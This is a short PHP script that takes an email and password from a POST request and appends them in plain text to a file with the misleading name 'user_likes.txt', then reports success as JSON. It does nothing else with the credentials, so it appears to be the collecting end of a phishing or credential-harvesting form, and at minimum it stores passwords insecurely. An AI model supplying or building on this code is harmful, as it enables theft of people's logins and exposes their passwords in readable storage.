<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        // Validate input data
        if (empty($_POST['email']) || empty($_POST['password'])) {
            throw new Exception('Email and password fields cannot be empty.');
        }

        $email = htmlspecialchars($_POST['email']);
        $password = htmlspecialchars($_POST['password']);
        $data = "Email: $email, Password: $password" . PHP_EOL;

        // Define the file path
        $file = __DIR__ . '/user_likes.txt';

        // Check if the file is writable
        if (!is_writable($file)) {
            throw new Exception('The file is not writable. Check permissions.');
        }

        // Save the data to the file
        $result = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
        if ($result === false) {
            throw new Exception('Failed to write to the file.');
        }

        // Success response
        echo json_encode(['success' => true, 'message' => 'Data saved successfully!']);
    } catch (Exception $e) {
        // Error response
        http_response_code(500); // Internal Server Error
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
} else {
    // Invalid request method
    http_response_code(405); // Method Not Allowed
    echo json_encode(['success' => false, 'message' => 'Invalid request method. Use POST.']);
}
?>
